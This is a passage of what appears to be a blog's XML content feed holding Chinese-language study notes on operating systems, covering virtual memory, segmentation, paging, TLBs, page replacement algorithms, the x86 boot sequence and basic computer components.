    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第八章-虚拟内存（二）</title>
    <link href="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%982/"/>
    <url>/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%982/</url>
    
    <content type="html"><![CDATA[<h3 id="8-1-3-分段">8.1.3 分段</h3><ul><li><p>虚拟内存的含义</p><ul><li>分段允许把内存视为由<u>多个地址空间</u>或<u>段</u>组成，段的<strong>大小不等</strong>，并且是<strong>动态</strong>的。内存访问以<strong>段号和偏移量</strong>的形式组成地址</li></ul></li><li><p>与非段式地址空间相比有许多优点∶</p><ul><li>简化了对<u>不断增长的</u><strong>数据结构</strong>的处理</li><li>允许程序<strong>独立</strong>地<u>改变或重新编译</u>，而不要求整个程序集重新链接和重新加载</li><li>有助于<strong>进程间的共享</strong><ul><li>可以在段中放置一个实用工具程序或一个有用的数据表，供其他进程访问</li></ul></li><li>有助于保护<ul><li>一个段可被构造成包含一个<strong>明确定义的程序或数据集</strong>==&gt;程序员或系统管理员可以更方便地<strong>指定访问权限</strong></li></ul></li></ul></li><li><p>组织</p><ul><li><p>每个进程都有自己的段表，当它的<strong>所有段</strong>都装入内存时，会为该进程创建一个<strong>段表</strong>并<strong>装入内存</strong></p></li><li><p>每个<strong>段表项</strong>包含相应段在内存中的<strong>起始地址</strong>和<strong>段的长度</strong></p></li><li><p>每个段表项中需要有一位表明相应的段<strong>是否在内存中</strong></p></li><li><p>修改位：相应的段从<u>上次被装入内存</u>到目前为止其内容是否已改变</p></li><li><p>地址转换</p><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%982/os8.11.jpg" class=""></li></ul></li></ul><h3 id="8-1-4-段页式">8.1.4 段页式</h3><ul><li><p>比较：</p><ul><li>分页<ul><li>对程序员透明</li><li>消除了外部碎片，能更有效地使用内存</li><li>由于移入或移出内存的块是固定的、大小相等的，因而有可能开发出更精致的存储管理算法</li></ul></li><li>分段</li><li>对程序员可见</li><li>具有处理不断增长的数据结构的能力，及支持共享和保护的能力</li></ul></li><li><p>结合==&gt;段页式</p><ul><li>用户的<strong>地址空间</strong>被划分为许多<strong>段</strong>，每段依次划分为许多<strong>固定大小的页</strong>， <strong>页的长度</strong>等于<strong>内存中的页框大小</strong></li><li>若某段的长度<strong>小于</strong>页，则该段只占据一页</li><li>从程序员的角度看， <strong>逻辑地址</strong>仍然由<strong>段号</strong>和<strong>段偏移量</strong>组成</li><li>从系统的角度看，<strong>段偏移量</strong>可视为指定段中的一个<strong>页号</strong>和<strong>页偏移量</strong></li><li><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%982/os.jpg" class=""></li><li><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%982/os8.12.jpg" class=""></li></ul></li></ul><h3 id="8-1-5-保护和共享">8.1.5 保护和共享</h3><ul><li><p>分段有助于实现<strong>保护与共享</strong>机制</p></li><li><p>每个段表项包括一个<strong>长度</strong>和一个<strong>基地址</strong>==&gt; 程序<u>不会</u>不经意地访问超出该段的内存单元</p></li><li><p>共享==&gt; 一个段可能会在多个进程的段表中引用</p><p>(在分页系统中也可得到同样的机制。但是，这种情况下由于<strong>程序的页结构和数据</strong>对程序员<strong>不可见</strong>，因此更难说明共享和保护需求)</p><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%982/os8.13.jpg" class=""></li></ul><h1>8.2 操作系统软件</h1><ul><li>操作系统的内存管理设计取决于三个基本的选择<ul><li>是否使用虚存技术</li><li>是使用分页还是使用分段，或同时使用二者</li><li>为各种存储管理特征采用的算法</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%982/os2.jpg" class=""><h3 id="8-2-1-读取策略">8.2.1 读取策略</h3><ul><li><p>常用的两种方法</p><ul><li><p>请求分页（demand paging）</p><ul><li><p>只有当访问到某页中的一个单元时才将该页取入内存</p></li><li><p>当一个进程首次启动时，会在一段时间出现大量的缺页中断</p></li><li><p>取入越来越多的页后，局部性原理表明大多数将来访问的页都是最近读取的页</p><p>==&gt; 在一段时间后错误会逐渐减少，缺页中断的数量会降到很低</p></li></ul></li><li><p>预先分页 （prepaging)</p><ul><li>读取的页并不是缺页中断请求的页</li><li>利用了大多数<strong>辅存设备</strong>（如磁盘） 的特性</li><li>若一个进程的页<strong>连续存储</strong>在<strong>辅存</strong>中，则一次读取许多连续的页要比隔一段时间读取一页有效</li><li>若大多数额外读取的页<strong>未引用到</strong>，则这个策略是低效的</li></ul></li></ul></li><li><p>进程<strong>首次启动</strong>时，可采用预先分页策略，此时程序员须以某种方式指定需要的页;发生缺页中断时也可采用预先分页策略，由于<u>这个过程对程序员不可见</u>，因此更为可取。但是，预先分页的实用工具程序还未建立</p></li><li><p>不要把预先分页和交换混淆</p><ul><li>某个进程被<strong>换出内存并置于挂起态</strong>时，它的<strong>所有驻留页</strong>都会被换出。当该进程被唤醒时，<strong>所有以前在内存中的页</strong>都会被<strong>重新读回内存</strong></li></ul></li></ul><h3 id="8-2-2-放置策略">8.2.2 放置策略</h3><ul><li>决定一个进程块驻留在<strong>实存</strong>中的什么位置</li><li>在纯分段系统中，放置策略不重要题，最佳适配、首次适配等都可供选择</li><li>对于<strong>纯分页系统</strong>或<strong>段页式系统</strong>， 如何放置通常无关紧要<ul><li><strong>地址转换硬件</strong>和<strong>内存访问硬件</strong>能以相同的效率为任何页框组合执行相应的功能</li></ul></li><li>Important in a segmentation system and <strong>nonuniform memory access(NUMA) system</strong>, 非一致存储访问多处理器<ul><li>在非一致存储访问多处理器中，机器中分布的共享内存可被机器的任何处理器访问，但访问某 一特定物理单元所需的时间会随处理器和内存模块之间距离的不同而变化</li><li>其性能很大程度上取决于数据驻留的位置与使用数据的处理器间的距离</li></ul></li></ul><h3 id="8-2-3-置换策略">8.2.3 置换策略</h3><ul><li><p>处理在必须读取一个新页时，应该<strong>置换内存中的哪一页</strong></p></li><li><p>页框锁定</p><ul><li>内存中的某些页框可能是被锁定的。一个页框被锁定时， 当前保存在该页框中的页就<strong>不能被置换</strong></li><li><strong>大部分操作系统内核</strong>和<strong>重要的控制结构</strong>就保存在锁定的页框中</li><li><strong>I/O缓冲区</strong>和其他<strong>对时间要求严格的区域</strong>也可能锁定在内存的页框中</li><li>锁定是通过<strong>给每个页框关联一个&quot;锁定&quot;位</strong>实现的，这一位可以包含在<strong>页框表</strong>和<strong>当前的页表</strong>中</li></ul></li><li><p>基本算法</p><ul><li><p>最佳（Optimal，<strong>OPT</strong>）</p><ul><li>置换<strong>下次访问</strong>距当前时间最长的那，基于未来</li><li>页中断最少</li><li>不能实现，可作为衡量其他算法性能一种标准</li></ul></li><li><p>最近最少使用（Least Recently Used，<strong>LRU</strong>）</p><ul><li><p>置换内存中<strong>最长时间未被引用</strong>的页</p></li><li><p>根据局部性原理，是最近最不可能访问到的页</p></li><li><p>性能接近于OPT策略，较难实现</p><ul><li><p>1、给每页添加一个最后一次访问的<strong>时间戳</strong>，并在<strong>每次访问内存</strong>时<strong>更新</strong>这个时间戳</p></li><li><p>2、维护一个关于访问页的栈</p><p>（两种方法开销都很大）</p></li></ul></li></ul></li><li><p>先进先出（First In First Out，<strong>FIFO</strong>）</p><ul><li>把分配给进程的页框视为一个<strong>循环缓冲区</strong>，并按循环方式移动页</li><li>需要的只是一个指针，该指针在进程的页框中循环</li><li>实现起来最简单</li><li>隐含逻辑：置换驻留在内存中<strong>时间最长</strong>的页</li><li>一部分程序或数据在整个程序的生命周期中使用频率都很高==&gt;这些页需要被反复地换入和换出</li></ul></li><li><p>时钟（<strong>Clock</strong>）</p><ul><li>使用位<ul><li>某页<strong>首次装入内存</strong>时，将该页框的使用位置为<strong>1</strong></li><li><strong>被访问</strong>时（在访问产生缺页中断后），其使用位也会置为<strong>1</strong></li></ul></li><li>指针<ul><li>用于置换的候选页框集（当前进程：局部范围；整个内存：全局范围）被视为一个循环缓冲区，并有一个指针与之相关联</li><li>当一页<strong>被置换</strong>时，该指针被置为指向缓冲区中的<strong>下一个</strong>页框</li><li>需要置换一页时，操作系统扫描缓冲区，查找使用位置为0的一个页框</li><li>每当遇到一个使用位为1的页框，操作系统就将该位重置为0</li></ul></li></ul></li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%982/os8.14.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%982/os8.15.jpg" class=""><ul><li><p>页缓冲</p><ul><li><p>能提高分页的性能并允许使用较简单的页面置换策略的一种方法是页缓冲</p></li><li><p><strong>VAX VMS</strong>方法（页面置换算法是简单的FIFO），不丢弃置换出的页</p><ul><li><p>若未被修改，则分配到<strong>空闲页链表</strong>中</p><ul><li>空闲页链表内包含有页中可以读取的一系列页框</li><li>当未经修改的一页被置换时，它<strong>仍然在内存</strong>中，且其<strong>页框</strong>被添加到空闲页链表的尾部</li></ul></li><li><p>若已被修改，则分配到<strong>修改页链表</strong>中</p></li><li><p>该页在内存中并<strong>不会物理性移动</strong>，移动的只是该页所对应的<strong>页表项</strong>，移动后的页表项放置在空闲页链表中或修改页链表中</p></li><li><p>重要特点：<strong>被置换的页仍然留在内存中</strong></p><p>==&gt;若进程访问该页，则可<strong>迅速返回该进程的驻留集</strong>，且<strong>代价很小</strong></p><p>(空闲页链表和修改页链表充当着<strong>页的高速缓存</strong>的角色)</p></li><li><p>修改页链表还有另一种很有用的功能：已修改的页<strong>按簇写回</strong>，而不是一次只写一页，因此大大<strong>减少了I/O操作的数量</strong>，进而<strong>减少了磁盘访问时间</strong></p></li></ul></li><li><p>Mach 操作系统现了一种更简单的页缓冲，不区分修改页和未修改页</p></li></ul></li><li><p>置换策略和高速缓存大小</p><ul><li>随着内存越来越大，应用的局部性特性逐渐降低==&gt;高速缓存的大小也相应增加</li><li>对于较大的高速缓存，虚存页的置换对性能可能会有所影响。若选择置换的页框在高速缓存中，则该高速缓存块及保存在块中的页都会失效</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第八章-虚拟内存（一）</title>
    <link href="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%981/"/>
    <url>/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%981/</url>
    
    <content type="html"><![CDATA[<p>虚拟内存术语</p><table><thead><tr><th>术语</th><th>说明</th></tr></thead><tbody><tr><td>虚拟内存</td><td>在存储分配机制中，尽管备用内存是主存的一部分，但它也可被寻址<br /><u>程序引用内存使用的地址</u>与<u>(内存系统)(虚拟内存)用于识别(物理存储站点)的地址</u>是不同的，程序生成的地址会自动转换为机器地址<br />虚拟存储的大小受<u>计算机系统寻址机制</u>和<u>可用的备用内存量</u>的限制，而<strong>不受主存储位置实际数量的限制</strong></td></tr><tr><td>虚拟地址</td><td>在虚拟内存中分配给某一位置的地址，它使得该位置可被访问，就好像是主存的一部分那样</td></tr><tr><td>虚拟地址空间</td><td>分配给进程的虚拟存储</td></tr><tr><td>地址空间</td><td>用于某进程的内存地址范围</td></tr><tr><td>实地址</td><td>内存中存储位置的地址</td></tr></tbody></table><h1>8.1 硬件和控制结构</h1><p>1、<strong>进程中的所有内存访问都是逻辑地址</strong>，这些逻辑地址会在运行时动态地转换为物理地址。 这意味着一个进程可被换入或换出内存，因此进程可在执行过程的不同时刻占据内存中的不同区域</p><p>2、 一个进程可划分为许多块（页和段），在执行过程中，这些块不需要连续地位于内存中。动态运行时地址转换和页表或段表的使用使得这一点成为可能</p><ul><li><p>进程执行的<u>任何时候都在内存</u>的部分称为进程的<strong>常驻集（resident set）</strong></p></li><li><p>进程执行时，只要所有内存访问都是访问常驻集中的单元，执行就可以顺利进行</p></li><li><p>处理器需要访问一个不在内存中的逻辑地址时，会产生一个中断，这表明出现了内存访问故障。操作系统会把被中断的进程置于<strong>阻塞态</strong></p><p>要继续执行这个进程，操作系统必须把包含引发访问故障的逻辑地址的进程块<strong>读入内存</strong></p><p>操作系统产生一个<strong>磁盘 I/O读请求</strong></p><p>执行磁盘 I/O期间， 操作系统可以调度另一个进程运行</p><p>需要的块读入内存后，产生一个I/O中断，控制权交回给操作系统，而操作系统则把由于缺少该块而被阻塞的进程置为<strong>就绪态</strong></p></li><li><p>提高系统利用率的实现方法：</p><ul><li>内存中保留多个进程<ul><li>仅装入某个进程的某些块→足够的空间来放置更多的进程→任何时刻这些进程中至少有一个处于就绪态→处理器得到了更有效的利用</li></ul></li><li>进程可以比内存的全部空间还大<ul><li>分块→覆盖→利用基于分块或分段的虚存</li><li>操作系统在需要时会自动地把进程块装入内存</li></ul></li></ul></li><li><p><strong>实存储器（real memory）</strong></p><ul><li>实存</li><li>进程只能在内存中执行</li></ul></li></ul><h3 id="8-1-1-局部性和虚拟内存">8.1.1 局部性和虚拟内存</h3><ul><li><p><strong>系统抖动（thrashing）<strong>的情况∶处理器的大部分时间都用于</strong>交换块</strong>而非<strong>执行指令</strong></p></li><li><p>每个进程都有自己的页表，当它的所有页都装入内存时，<strong>将创建页表并装入内存</strong></p></li><li><p>**页表项（Page Table Entry，PTE）**包含有与内存中的页框相对应的页框号</p></li><li><p>每个页表项需要有一位（P）来表示它所对应的页当前是否在内存中，若这一位表示该页在内存中，则这个页表项还包括该页的页框号</p></li></ul><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%981/8.1a.jpg" class=""><ul><li>页表项中所需要的另一个控制位是<strong>修改位（M）</strong>，它表示相应页的内容从<u>上次装入内存到现在</u>是否已改变<ul><li>若未改变，则在需要把该页换出时，无须用页框中的内容更新该页</li></ul></li><li>页表项还须提供其他一些控制位，例如，若需要在页一级控制保护或共享</li></ul><h6 id="页表结构">页表结构</h6><ul><li><p>从内存中读取一个字的基本机制包括使用页表从虚拟地址到物理地址的转换</p><ul><li>虚拟地址又称为逻辑地址<ul><li>页号 + 偏移量</li></ul></li><li>物理地址<ul><li>页框号 + 偏移量</li></ul></li></ul></li><li><p>当某个特定的进程正运行时，一个<u>寄存器</u>保存该<strong>进程页表的起始地址</strong></p><p><strong>虚拟地址的页号</strong>用于<strong>检索页表</strong>、<strong>查找相应的页框号</strong>，并与<strong>虚拟地址的偏移量</strong>结合起来形成需要的<strong>实地址</strong></p><p>一般来说， 页号域长于页框号域（n&gt;m）</p><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%981/8.2.jpg" class=""></li><li><p>在大多数系统中，每个进程都有一个页表。每个进程可以占据大量的虚存空间</p></li><li><p>每个进程有多个页表项（进程的虚存空间/每页大小）=》大多数虚拟内存方案都在虚存而非实存中保存页表=》页表和其他页一样都服从分页管理</p><ul><li><p>如果页目录的长度为X，且一个页表的最大长度为Y，则一个进程可以有XY页</p></li><li><p>用于32位地址的两级方案的典型例子</p><ul><li>假设采用<u>字节级</u>的寻 4MB用户页表址，页尺寸为4KB（2^12^），则 4GB（2^32^） 虚拟地址空间由2^20^页组成。若这些页中的每页都由一个<u>4字节的页表项</u>映射，则可创建由 2^20^个页表项组成的一个页表，这时需要4MB（2^22^）的内存空间</li></ul><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%981/8.3.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%981/8.4.jpg" class=""></li></ul></li><li><p>缺点：页表的大小与虚拟地址空间的大小成正比</p></li></ul><h6 id="倒排页表">倒排页表</h6><ul><li><p>虚拟地址的页号部分使用一个简单的散列函数映射到散列表中</p></li><li><p>散列表和倒排表中各有一项对应 于一个<strong>实存页</strong>而非虚拟页</p></li><li><p>不论有多少进程、支持多少虚拟页，页表都只需要实存中的一个固定部分</p></li><li><p>多个虚拟地址可能映射到同一个散列表项中==&gt;需要使用一种链接技术来管理这种溢出</p></li><li><p>“倒排”==&gt;使用<strong>页框号</strong>而非虚拟页号来索引页表项</p><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%981/os8.5.jpg" class=""><ul><li>页号∶虚拟地址的页号部分</li><li>进程标志符∶<strong>使用该页的进程</strong>。页号和进程标志符共同标志一个<u>特定进程</u>的<strong>虚拟地址空间</strong>的<u>一页</u></li><li>控制位∶该域包含一些标记，比如有效、访问和修改，以及保护和锁定信息</li><li>链指针∶若某项没有链项，则该域为空（或用一个单独的位来表示）。否则，该域包含链中<strong>下一项的索引值</strong>（0～2^m^-1之间的数字）</li></ul></li></ul><h6 id="转换检测缓冲区">转换检测缓冲区</h6><p>原则上，每次虚存访问都可能会引起两次物理内存访问：一次取相应的页表项， 另一次取需要的数据</p><p>==&gt;简单的虚拟内存方案会导致<strong>内存访问时间加倍</strong></p><p>==&gt;(解决方案)使用<strong>转换检测缓冲区（Translation Lookaside Buffer，TLB）</strong></p><ul><li><p>功能和高速缓冲存储器相似，包含有最近用过的页表项</p></li><li><p>给定一个虚拟地址</p><p><strong>处理器</strong>首先检查TLB：</p><ul><li><strong>需要的页表项</strong>在其中（<strong>TLB命中</strong>），则检索<strong>页框号</strong>并形成<strong>实地址</strong></li><li>未找到需要的页表项（TLB未命中）， 则处理器用<strong>页号</strong>检索<strong>进程页表</strong>，并检查相应的页表<ul><li>**“存在位”**已置位<ul><li>该页<strong>在内存</strong>中，处理器从<strong>页表项</strong>中检索<strong>页框号</strong>以形成<strong>实地址</strong></li><li><u>处理器</u>同时<strong>更新 TLB</strong>，使其包含这个新页表项</li></ul></li><li>若&quot;存在位&quot;未置位<ul><li>需要的页不在内存中，这时会产生一次<strong>内存访问故障</strong>，称为<strong>缺页（page fault） 中断</strong></li><li>离开硬件作用范围，调用操作系统==&gt;由操作系统负责装入所需要的页，并<strong>更新页表</strong></li></ul></li></ul></li><li><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%981/os8.6.jpg" class=""></li><li><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%981/os8.7.jpg" class=""></li></ul></li><li><p>由于TLB仅包含整个页表中的部分表项， 因此不能简单地把页号编入TLB的索引</p></li><li><p>TLB中的项必须包括<strong>页号</strong>和<strong>完整的页表项</strong></p></li><li><p>处理器中的硬件机制允许<strong>同时查询许多TLB页</strong>，以确定是否存在匹配的<strong>页号</strong></p></li><li><p><strong>关联映射（associative mapping）</strong></p><ul><li><p>在<strong>页表</strong>中查找所用的<strong>直接映射或索引</strong></p><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%981/os8.8.jpg" class=""></li></ul></li><li><p><u>虚存机制</u>须与<strong>高速缓存系统</strong>（不是TLB高速缓存，而是<strong>内存高速缓存</strong>）进行<strong>交互</strong></p><p>1、内存系统查看 TLB 中是否存在匹配的页表项</p><ul><li><p>存在==&gt;组合页框号和偏移量，形成实地址（<strong>物理地址</strong>）</p></li><li><p>不存在==&gt;从页表中<strong>读取页表项</strong></p><p>==&gt;产生由一个<strong>标记（tag</strong>）和其余部分组成的<strong>实地址</strong></p></li></ul><p>2、查看<strong>高速缓存</strong>中是否存在包含这个字的<strong>块</strong></p><ul><li>存在==&gt;则把它<strong>返回给CPU</strong></li><li>不存在==&gt;则<strong>从内存中检索</strong>这个字</li></ul><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%981/os8.9.jpg" class=""></li><li><p>注意</p><ul><li>页表项可能在：TLB、内存、磁盘</li><li>访问的字可能在：高速缓存、内存、磁盘</li><li>若被访问的字<strong>只在磁盘</strong>中，则包含该字的<strong>页</strong>必须装入<strong>内存</strong>，且它所在的<strong>块</strong>须装入<strong>高速缓存</strong>。此外，包含该字的<strong>页</strong>所对应的<strong>页表项必须更新</strong></li></ul></li></ul><h6 id="页尺寸">页尺寸</h6><p>考虑因素：内部碎片、基于大多数辅存设备的物理特性考虑（希望页尺寸比较大，从而实现更有效的数据块传送）、物理内存的大小、程序大小</p><ul><li>页越小，<strong>内部碎片的总量</strong>越少</li><li>页越小，每个进程需要的<strong>页的数量</strong>就越多==&gt;更大的页表</li><li>一次内存访问可能产生两次缺页中断<ul><li>第一次读取所需的<strong>页表</strong>部分</li><li>第二次读取<strong>进程页</strong></li></ul></li></ul><p>缺页率影响因素：页尺寸、分配给一个进程的<strong>页框</strong>的数量</p><ul><li><p>页尺寸对缺页中断发生概率的影响：</p><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%981/os8.10.jpg" class=""><ul><li><p>页尺寸非常小==&gt;每个进程在内存中就有<strong>较多数量的页</strong></p><p>一段时间后，内存中的页都包含有最近访问的部分，因此缺页率较低</p></li><li><p>尺寸增加 ==&gt;每页包含的单元和任何一个最近访问过的单元越来越远 ==&gt;局部性原理的影响被削弱 ==&gt;缺页率开始增长</p></li><li><p>当页尺寸<strong>接近整个进程的大小</strong>时（图中的 P点），缺页率开始下降</p></li><li><p>当一页包含整个进程时，不会发生缺页中断</p></li></ul></li><li><p>页框数的影响</p><ul><li>对固定的页尺寸，当内存中的页数量增加时，缺页率会下降</li><li>软件策略（分配给每个进程的内存总量）影响着硬件设计决策（页尺寸）</li></ul></li></ul><p>考虑物理内存的大小和程序大小</p><ul><li><p>当内存变大时，应用程序使用的地址空间也相应增长（个人计算机、工作站）</p></li><li><p>大型程序中所用的<strong>当代程序设计技术</strong>可能会降低进程中的<strong>局部性</strong></p><ul><li><strong>面向对象技术</strong>鼓励使用<strong>小程序</strong>和<strong>数据模块</strong>，它们的引用在相对较短的时间内散布在相对较多 的对象中</li><li><strong>多线程应用</strong>可能导致<strong>指令流</strong>和<strong>分散内存访问</strong>的<u>突然变化</u></li></ul></li><li><p>对于给定大小的TLB，当<strong>进程的内存大小增加</strong>且<strong>局部性降低</strong>时，TLB访问的<strong>命中率降低</strong>==&gt;TLB可能会成为一个<strong>性能瓶颈</strong></p></li><li><p>提高TLB性能的方法</p><ul><li>使用包含<strong>更多项</strong>的<strong>更大</strong>TLB<ul><li>but: 影响其他的硬件设计特征==&gt;TLB 的大小不可能像内存大小增长得那么快</li></ul></li><li>采用更大的页<ul><li>使TLB中的每个页表项对应于更大的存储块</li><li>but: 较大的页可能会导致<strong>性能下降</strong></li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/02/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F1/"/>
    <url>/2024/02/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F1/</url>
    
    <content type="html"><![CDATA[<p>计算机如何工作：取指执行</p><h5 id="打开电源时发生了什么：">打开电源时发生了什么：</h5><ul><li><p>要关注指针IP（PC）及其指向的内容</p></li><li><p>x86PC常识：</p><ul><li><p>x86PC刚开机时CPU处于实模式（和保护模式相对应，实模式的寻址CS：PC（CS左移4位+IP））</p></li><li><p>开机时，CS=0xFFFF；IP=0x00000</p></li><li><p>寻址0xFFFF0（ROM BIOS映射区）</p><ul><li>BIOS（basic input output system，基本输入输出系统）</li></ul></li><li><p>检查RAM，键盘，显示器，软硬磁盘</p></li><li><p>将磁盘0磁道0扇区（引导扇区）读入0x7c00处</p><ul><li>0x7c00处存放的代码（就是从磁盘引导扇区读入的哪512个字节）<ul><li>引导扇区就是启动设备的第一个扇区（开机时按住del键可进入启动设备设置界面，可以设置为光盘启动）</li><li>启动设备信息被设置在CMOS中（CMOS：互补金属氧化半导体（64B-128B），用来存储实时钟和硬件配置信息）</li><li>硬盘的第一个扇区上存放着开机后执行的第一段我们可以控制的程序</li></ul></li></ul></li><li><p>设置cs=0x07c0，ip=0x0000</p></li></ul></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第一章-操作系统概述</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h1>操作系统各主题间的关联性</h1><img src="/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/133246.jpg" class=""><h1>基本构成</h1><img src="/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/1.jpg" class=""><h5 id="处理器：">处理器：</h5><ul><li><p>processor</p></li><li><p><strong>控制</strong>计算机的操作，执行<strong>数据处理</strong>功能</p><ul><li><p>与存储器<strong>交换数据</strong></p></li><li><p>通常使用两个内部（对处理器而言）寄存器：</p><ul><li><p>存储器<strong>地址</strong>寄存器，Memory Address Register，MAR</p><p>用于确定<strong>下一次读/写</strong>的存储器地址</p></li><li><p>存储器<strong>缓冲</strong>寄存器，Memory Buffer Register，MBR</p><p>存放<strong>要写入</strong>存储器的数据或从存储器中<strong>读取</strong>的数据</p></li></ul></li><li><p>输入/输出地址寄存器，I/O Address Register，I/O AR，I/O地址寄存器</p><p>用于确定一个特定的输入/输出设备</p></li><li><p>输入/输出缓冲寄存器，I/O Buffer Register，I/O BR，I/O缓冲寄存器</p><p>用于在输入/输出模块和处理器间交换数据</p></li></ul></li><li><p>只有一个处理器时，通常指中央处理器（CPU）</p></li></ul><h5 id="内存：">内存：</h5><ul><li>main memory</li><li>存储<strong>数据</strong>和<strong>程序</strong></li><li>存储<strong>易失</strong>性，具有非易失性的是磁盘存储器</li><li>亦称为实存储器real memory、主存储器primary memory</li><li>内存模块由一组单元组成，这些单元由顺序编号的地址定义</li><li>每个单元包含一个二进制数，可以解释为一个指令或数据</li></ul><h5 id="输入-输出模块：">输入/输出模块：</h5><ul><li><p>I/O modules</p></li><li><p>在 计算机和外部环境之间移动数据</p></li><li><p>外部环境由各种外部设备组成：</p><ul><li>辅助存储设备（硬盘等）</li><li>通信设备</li><li>终端</li></ul></li><li><p>包含内存缓冲区</p><p>保存临时文件，直至被发送出去</p></li></ul><h5 id="数据总线：">数据总线：</h5><ul><li>在处理器、内存、输入/输出设备之间提供通信的设施</li></ul><img src="/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/2.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/3.jpg" class=""><h1>微处理器的发展</h1><ul><li><p>微处理器可以在单个芯片上容纳一个处理器</p></li><li><p>处理速度：慢······（硬件上的交互信息缩短到纳秒量级）······&gt;快</p></li><li><p>如今微处理器成为了<strong>最快</strong>的<strong>通用处理器</strong></p></li><li><p>发展成为了多处理器：</p><ul><li><p>每个芯片（底座）上容纳了多个处理器（内核）</p></li><li><p>每个处理器上有多层大容量缓存</p></li><li><p>多个处理器之间共享内核的执行单元</p></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/151714.jpg" 